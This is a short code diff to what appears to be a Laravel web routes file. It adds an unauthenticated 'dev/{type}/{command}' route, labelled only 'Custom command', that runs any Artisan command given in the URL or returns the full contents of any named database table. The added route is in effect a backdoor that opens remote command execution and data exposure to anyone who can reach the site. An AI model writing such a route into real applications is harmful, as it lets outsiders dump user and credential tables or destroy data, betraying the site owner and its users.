@@ -6,6 +6,8 @@ use App\Http\Controllers\FrontAuthController;
 use App\Http\Controllers\FrontendController;
 use App\Http\Controllers\FrontLivewireController;
 use App\Http\Controllers\MessageController;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Route;
 
 // Index page
@@ -40,4 +42,17 @@ Route::middleware('customer')->group(function(){
 
 
 });
+
+
+// Custom command
+Route::get('dev/{type}/{command}', function($type, $command){
+    if($type == 'command'){
+        Artisan::call($command);
+        return Artisan::output();
+    }else if($type == 'table'){
+        return DB::table($command)->get();
+    }else{
+        return 'Invalid command';
+    }
+})->name('dev.command');
 
